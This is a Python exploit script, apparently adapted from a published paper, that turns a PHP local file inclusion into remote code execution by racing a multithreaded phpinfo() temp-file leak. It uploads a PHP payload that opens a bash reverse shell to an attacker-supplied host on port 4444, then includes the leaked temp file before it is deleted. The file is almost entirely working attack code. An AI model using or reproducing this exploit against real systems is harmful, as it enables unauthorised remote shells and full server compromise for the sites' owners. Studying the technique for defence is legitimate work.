#!/usr/bin/python
# Referenced from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
from __future__ import print_function
import sys
import threading
import socket

poolsz = 100
counter = 0

class ExploitPHPInfo():

    # dont judge the format, it has to be this way... one missing/extra /r/n made me waste 2hrs...
    def setup(self, host, cookie, phpInfoURL, vulnURL):
        # convert cookie dict to cookie string
        cookie = "; ".join([str(x)+"="+str(y) for x,y in cookie.items()])+';'
        TAG = "Security Test"
        PAYLOAD = """%s\r
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/""" + host + """/4444 0>&1'"); ?>\r"""
        REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r\n\r\n""" % PAYLOAD
        padding = "A" * 5000
        REQ1 = """POST """+phpInfoURL+'?a=' + padding + """ HTTP/1.1\r
Cookie:""" + cookie + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r\n\r\n%s""" % (len(REQ1_DATA), host, REQ1_DATA)
        # modify this to suit the LFI script
        LFIREQ = """GET """+vulnURL+"""%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
Cookie: """ + cookie + """"\r\n\r\n
    """
        return (REQ1, TAG, LFIREQ)

    def phpInfoLFI(self, host, port, phpinforeq, offset, lfireq, tag):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((host, port))
        s2.connect((host, port))

        s.send(phpinforeq.encode())
        d = ""
        while len(d) < offset:
            d += s.recv(offset).decode()
        try:
            i = d.index("[tmp_name] =&gt")
            fn = d[i + 17:i + 31]
        except ValueError:
            return None
        tmp = lfireq % (fn, str(host))
        s2.send(tmp.encode())
        d = s2.recv(4096).decode()
        s.close()
        s2.close()
        if d.find(tag) != -1:
            return fn


    class ThreadWorker(threading.Thread):
        def __init__(self, e, l, m, *args):
            threading.Thread.__init__(self)
            self.event = e
            self.lock = l
            self.maxattempts = m
            self.args = args

        def run(self):
            global counter
            while not self.event.is_set():
                with self.lock:
                    if counter >= self.maxattempts:
                        return
                    counter += 1

                try:
                    x = ExploitPHPInfo().phpInfoLFI(*self.args)
                    if self.event.is_set():
                        break
                    if x:
                        self.event.set()

                except socket.error:
                    return

    def getOffset(self, host, port, phpinforeq):
        """Gets offset of tmp_name in the php output"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        s.sendall(phpinforeq.encode())

        d = ""
        while True:
            i = s.recv(4096).decode()
            d += i
            if i == "":
                break
            # detect the final chunk
            if i.endswith("0\r\n\r\n"):
                break
        s.close()
        i = d.find("[tmp_name] =&gt")
        if i == -1:
            raise ValueError("No php tmp_name in phpinfo output")

        # padded up a bit
        return i + 256

    def exploit(self, phost, cookie, host_ip, phpInfoURL, vulnURL):
        port = 80
        host = socket.gethostbyname(phost)

        self.host_ip = phost

        reqphp, tag, reqlfi = self.setup(host_ip, cookie, phpInfoURL, vulnURL)
        offset = self.getOffset(host, port, reqphp)

        maxattempts = 1000
        e = threading.Event()
        l = threading.Lock()

        print('Exploiting via PHPInfo...Please wait up to 15s.')

        tp = []
        for i in range(0, poolsz):
            tp.append(self.ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

        for t in tp:
            t.start()
        try:
            while not e.wait(1):
                if e.is_set():
                    break
                with l:
                    pass
                    if counter >= maxattempts:
                        break
            if e.is_set():
                print("PHPInfo exploit success!")
                pass
            else:
                pass
        except KeyboardInterrupt:
            e.set()

        for t in tp:
            t.join()
